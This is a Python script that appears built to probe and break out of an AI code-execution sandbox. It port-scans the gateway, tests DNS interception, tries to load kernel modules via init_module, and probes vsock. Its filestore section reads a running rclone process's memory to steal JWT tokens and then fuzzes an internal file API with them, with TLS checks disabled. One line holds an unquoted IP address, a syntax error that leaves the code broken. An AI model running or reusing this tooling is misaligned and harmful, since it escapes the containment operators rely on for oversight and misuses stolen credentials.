#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""mediafit v5.5.0 -- gateway portscan, UDP/53 forwarded-vs-intercepted,
.ko hunt + init_module, filestore FUZZ (range/list/remove/create), bug proof."""
import os, sys, json, re, time, ssl, base64, socket, struct, select, ctypes, subprocess, traceback
import urllib.request, urllib.error

VER="5.5.0"; API="https://api.anthropic.com"; FS=API+"/v1/filestore/fs/"
OUTD="/mnt/user-data/outputs"

OUT,G=[],{}
def w(s=""): print(s,flush=True); OUT.append(str(s))
def head(t): w("\n"+"="*70+"\n### "+t+"\n"+"="*70)
P,F,U,I=[],[],[],[]
def rec(k,m,ev=None):
    w("    "+{"P":"[PASS]","F":"[FAIL]","U":"[UNK]","I":"[INFO]"}[k]+" "+m)
    if ev is not None: w("        "+str(ev)[:1300])
    {"P":P,"F":F,"U":U,"I":I}[k].append(m)
def sh(a,t=60):
    try:
        p=subprocess.run(a,capture_output=True,timeout=t)
        return p.returncode,p.stdout.decode("utf-8","replace"),p.stderr.decode("utf-8","replace")
    except Exception as e: return -1,"","EXC:%s"%e
def step(n,f):
    try: f()
    except Exception as e:
        w("    !! %s: %s"%(n,e)); w("    "+traceback.format_exc().strip().splitlines()[-1][:200])
_CTX=ssl.create_default_context(); _CTX.check_hostname=False; _CTX.verify_mode=ssl.CERT_NONE

def http_json(url,method="POST",token=None,body=None,t=15,hdrs=None,cap=400000):
    h={"User-Agent":"mediafit/"+VER}
    if token: h["Authorization"]="Bearer "+token
    if body is not None and not isinstance(body,bytes): body=json.dumps(body).encode()
    if body is not None and not (hdrs or {}).get("Content-Type"): h["Content-Type"]="application/json"
    if hdrs: h.update(hdrs)
    req=urllib.request.Request(url,method=method,headers=h,data=body)
    try:
        r=urllib.request.urlopen(req,timeout=t,context=_CTX); return r.status,r.read(cap)
    except urllib.error.HTTPError as e:
        try: return e.code,e.read()
        except Exception: return e.code,b""
    except Exception as e: return None,("ERR:%s"%e).encode()
def api(m,p,tk=None,t=15): return http_json(FS+m,"POST",tk,p,t,{"Connect-Protocol-Version":"1"})

def scan(ip,ports,timeout=0.7):
    open_=[]
    socks={}
    for p in ports:
        try:
            s=socket.socket(); s.setblocking(0); s.connect_ex((ip,p)); socks[s]=p
        except Exception: pass
    t0=time.time()
    while socks and time.time()-t0<timeout:
        r,_,_=select.select(list(socks),[], [], 0.05)
        for s in r:
            p=socks.pop(s)
            try:
                err=s.getsockopt(socket.SOL_SOCKET,socket.SO_ERROR)
                if err==0: open_.append(p)
            except Exception: pass
            s.close()
    for s in socks: s.close()
    return sorted(open_)

# ------------------------------------------------------------------ 1
def s_net():
    head("1. INTERFACES + GATEWAY PORTSCAN  <== new surface")
    for f in ["/proc/net/dev","/proc/net/route","/proc/net/arp"]:
        try:
            w("    --- %s"%f)
            for l in open(f).read().splitlines()[:12]: w("        %s"%l[:170])
        except Exception as e: w("    %s -> %s"%(f,e))
    rc,o,_=sh(["sh","-c","which ifconfig route arp 2>/dev/null; cat /proc/net/fib_trie 2>/dev/null | grep -oE '([0-9]{1,3}\\.){3}[0-9]{1,3}' | sort -u"])
    w("    tools/ips: %s"%o.strip()[:300])
    gw="192.0.2.1"
    ports=[22,53,80,443,1024,2024,2025,2375,2376,3000,4000,5000,5001,5002,5005,
           8000,8080,8443,8888,9000,9090,9112,12345,15004,15005]
    op=scan(gw,ports,1.0)
    w("    gateway %s open (targeted): %s"%(gw,op))
    if op: rec("P","gateway services: %s"%op)
    op2=scan(gw,list(range(1,1025)),1.6)
    w("    gateway %s open (1-1024): %s"%(gw,op2))
    if op2: rec("P","gateway low-port services: %s"%op2)
    for p in sorted(set(op+op2)):
        d,st=None,None
        try:
            s=socket.create_connection((gw,p),4); s.settimeout(3)
            s.sendall(b"GET / HTTP/1.0\r\n\r\n")
            try: d=s.recv(600)
            except Exception: d=b""
            w("        %s:%d banner -> %r"%(gw,p,d[:200]))
            s.close()
        except Exception as e: w("        %s:%d -> %s"%(gw,p,str(e)[:50]))

# ------------------------------------------------------------------ 2
def s_udp():
    head("2. UDP/53 forwarded-vs-intercepted (decisive)")
    q=b"\xab\xcd\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01"
    for ip,lbl in [("8.8.8.8","real DNS"),("1.1.1.1","real DNS"),
                   ("140.82.121.4","github IP (no DNS)"),
                   ("160.79.104.10","anthropic IP (no DNS)"),
                   ("127.0.0.1","loopback")]:
        try:
            s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); s.settimeout(4)
            s.sendto(q,(ip,53)); d,_=s.recvfrom(600); s.close()
            rc=d[3]&0x0F
            w("    UDP %-16s :53 %-22s -> %d b rcode=%d %r"%(ip,lbl,len(d),rc,d[:40]))
            if rc in (0,3) and ip not in ("8.8.8.8","1.1.1.1","127.0.0.1"):
                rec("P","*** UDP/53 INTERCEPTED (answered by a non-DNS IP) ***")
        except Exception as e:
            w("    UDP %-16s :53 %-22s -> %s"%(ip,lbl,str(e)[:60]))
    # arbitrary udp port?
    for port in [53,123,5353,9999]:
        try:
            s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); s.settimeout(3)
            s.sendto(q,(8.8.8.8,port)); d,_=s.recvfrom(600); s.close()
            w("    UDP 8.8.8.8:%-5d -> %d b"%(port,len(d)))
        except Exception as e: w("    UDP 8.8.8.8:%-5d -> %s"%(port,str(e)[:50]))

# ------------------------------------------------------------------ 3
def s_ko():
    head("3. kernel module hunt + init_module")
    rc,o,_=sh(["sh","-c","find / -xdev -name '*.ko*' 2>/dev/null | head -30"])
    w("    *.ko found: %s"%(o.strip()[:500] or "NONE"))
    rc,o,_=sh(["sh","-c","uname -r; cat /proc/version | head -1"])
    w("    kernel: %s"%o.strip()[:200])
    ko=o.splitlines()
    for p in (o.strip().splitlines() if o.strip() else []):
        if p.endswith(".ko") and "vsock" in p:
            try:
                data=open(p,"rb").read()
                libc=ctypes.CDLL("libc.so.6",use_errno=True)
                buf=ctypes.create_string_buffer(data)
                r=libc.syscall(105,buf,ctypes.c_ulong(len(data)),ctypes.c_char_p(b""))  # init_module
                w("    init_module(%s) -> %s errno=%s"%(p,r,ctypes.get_errno()))
                if r==0: rec("P","loaded %s"%p)
            except Exception as e: w("    init_module %s -> %s"%(p,e))
    cid=None
    try:
        import fcntl
        f=os.open("/dev/vsock",os.O_RDONLY)
        cid=struct.unpack("I",fcntl.ioctl(f,0x7b9,struct.pack("I",0)))[0]; os.close(f)
    except Exception: pass
    w("    local CID=%s"%cid)
    if cid:
        for port in [2024,5001]:
            try:
                s=socket.socket(socket.AF_VSOCK,socket.SOCK_STREAM); s.settimeout(6)
                s.connect((cid,port))
                s.sendall(b"GET /status HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n")
                try: d=s.recv(2000)
                except socket.timeout: d=b"<timeout>"
                w("    vsock self:%d -> %r"%(port,d[:200])); s.close()
                if d and b"HTTP" in d: rec("P","*** vsock self:%d LIVE ***"%port)
            except Exception as e: w("    vsock self:%d -> %s"%(port,str(e)[:60]))

# ------------------------------------------------------------------ 4
def s_filestore():
    head("4. FILESTORE FUZZ (range / list / remove / create)")
    JWT=re.compile(rb"eyJ[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}")
    tk=None; up=None; fsid=None; seen={}
    for pid in os.listdir("/proc"):
        if not pid.isdigit(): continue
        try:
            if b"rclone" not in open("/proc/%s/cmdline"%pid,"rb").read(): continue
            maps=open("/proc/%s/maps"%pid).read().splitlines(); mem=open("/proc/%s/mem"%pid,"rb",0)
        except Exception: continue
        for l in maps:
            try: a,perms=l.split()[0],l.split()[1]
            except Exception: continue
            if "r" not in perms: continue
            try: s0,e0=[int(x,16) for x in a.split("-")]
            except Exception: continue
            if not (0<e0-s0<=256*1024*1024): continue
            try: mem.seek(s0); d=mem.read(e0-s0)
            except Exception: continue
            for m in JWT.findall(d):
                t=m.decode()
                if len(t.split(".")[2])!=86: t=".".join(t.split(".")[:2]+[t.split(".")[2][:86]])
                try: pl=json.loads(base64.urlsafe_b64decode(t.split(".")[1]+"=="))
                except Exception: continue
                f=pl.get("filesystem_id"); roots=pl.get("allowed_roots") or []
                if not f or t in seen: continue
                seen[t]=1
                st,_=api("listDirectory",{"filesystem_id":f,"path":roots[0] if roots else "/outputs"},t)
                if st==200:
                    fsid=f
                    if "/outputs" in roots: tk=t
                    if "/uploads" in roots: up=t
    w("    fsid=%s write=%s uploads=%s"%(fsid,bool(tk),bool(up)))
    if not tk: rec("U","no write token"); return
    api("makeDirectory",{"filesystem_id":fsid,"path":"/outputs"},tk)
    # --- createFile (FIXED: all bytes) ---
    B=("----mf"+base64.urlsafe_b64encode(os.urandom(6)).rstrip(b"=").decode()).encode()
    def mp(params,fn,fd):
        out=b"--"+B+b"\r\nContent-Disposition: form-data; name=\"params\"\r\n"
        out+=b"Content-Type: application/json\r\n\r\n"+json.dumps(params).encode()+b"\r\n"
        out+=b"--"+B+b"\r\nContent-Disposition: form-data; name=\"file\"; filename=\""+fn.encode()+b"\"\r\n"
        out+=b"Content-Type: application/octet-stream\r\n\r\n"+fd+b"\r\n"
        return out+b"--"+B+b"--\r\n"
    H={"Content-Type":"multipart/form-data; boundary="+B.decode(),"Connect-Protocol-Version":"1"}
    st,b=http_json(FS+"createFile","POST",tk,
                   mp({"filesystem_id":fsid,"path":"/outputs/mf.txt","media_type":"text/plain"},"mf.txt",b"MEDIAFIT-OK"),
                   25,H)
    w("    createFile -> %s %s"%(st,b[:280].decode("utf-8","replace")))
    if st==200: rec("P","*** createFile WORKS ***")
    # --- listDirectory characterisation (bug proof) ---
    st,b=api("listDirectory",{"filesystem_id":fsid,"path":"/outputs"},tk)
    w("    listDirectory /outputs -> %s body=%r"%(st,b[:400]))
    local=sorted(os.listdir("/mnt/user-data/outputs")) if os.path.isdir("/mnt/user-data/outputs") else []
    w("    local /outputs has %d entries: %s"%(len(local),local[:6]))
    if st==200 and b.strip() in (b"{}",b"") and local:
        rec("P","*** BUG PROVEN: listDirectory empty while dir is NOT empty ***")
    for extra in [{"recursive":True},{"includeEntries":True},{"pageSize":100}]:
        body={"filesystem_id":fsid,"path":"/outputs"}; body.update(extra)
        st2,b2=api("listDirectory",body,tk)
        w("    listDirectory %-18s -> %s %r"%(list(extra)[0],st2,b2[:200]))
    # --- readFile back ---
    st,b=api("readFile",{"filesystem_id":fsid,"path":"/outputs/mf.txt"},tk)
    w("    readFile -> %s %r"%(st,b[:120]))
    # --- range beyond EOF ---
    if up:
        try:
            fl=sorted(x for x in os.listdir("/mnt/user-data/uploads") if x.lower().endswith((".png",".jpg",".jpeg")))
            if fl:
                png=fl[0]; lsz=os.path.getsize("/mnt/user-data/uploads/"+png)
                st,b=api("readFile",{"filesystem_id":fsid,"path":"/uploads/"+png},up)
                w("    baseline -> %s len=%d local=%d"%(st,len(b),lsz))
                for lbl,off,ln in [("at-EOF",lsz,32),("past-EOF",lsz+100,64),
                                   ("way-past",lsz+100000,128),("zero-len",0,0),("neg-len",0,-5)]:
                    st2,b2=api("readFile",{"filesystem_id":fsid,"path":"/uploads/"+png,
                                           "range":{"offset":off,"length":ln}},up)
                    w("    range %-9s off=%-8d len=%-7d -> %s got=%d %r"%(lbl,off,ln,st2,len(b2),b2[:40]))
                    if st2==200 and lbl in ("past-EOF","way-past") and len(b2)>0:
                        rec("P","*** RANGE BEYOND EOF returned %d bytes ***"%len(b2))
        except Exception as e: w("    range -> %s"%e)
    # --- removeFile on a directory (bug proof) ---
    for lbl,body in [("dir /outputs",{"filesystem_id":fsid,"path":"/outputs"}),
                     ("missing",{"filesystem_id":fsid,"path":"/outputs/__nope"}),
                     ("file mf.txt",{"filesystem_id":fsid,"path":"/outputs/mf.txt"})]:
        st,b=api("removeFile",body,tk)
        w("    removeFile %-14s -> %s %s"%(lbl,st,b[:160].decode("utf-8","replace")))
        if st==500: rec("P","*** removeFile 500 on %s ***"%lbl)
    # --- weird paths / names ---
    for name,mt in [("a b.txt","text/plain"),("dot.name.txt","text/plain"),
                    ("uni_é_ñ.txt","text/plain"),("noext","application/octet-stream")]:
        st,b=http_json(FS+"createFile","POST",tk,
                       mp({"filesystem_id":fsid,"path":"/outputs/"+name,"media_type":mt},name,b"x"),20,H)
        w("    createFile %-14s -> %s %s"%(name,st,b[:110].decode("utf-8","replace")))

def s_verdict():
    head("VERDICT")
    w("  PASS %d: %s"%(len(P),P)); w("  UNK %d: %s"%(len(U),U))

def main():
    for n,f in [("net",s_net),("udp",s_udp),("ko",s_ko),("filestore",s_filestore),("verdict",s_verdict)]:
        step(n,f)
try: main()
except Exception as e: w("!! %s"%e); w(traceback.format_exc())
finally:
    txt="\n".join(OUT)
    for d in [OUTD,"/tmp","/root"]:
        try:
            os.makedirs(d,exist_ok=True)
            with open(os.path.join(d,"mediafit-report.txt"),"w") as fh: fh.write(txt)
        except Exception: pass
    print("\nreport -> %s/mediafit-report.txt"%OUTD)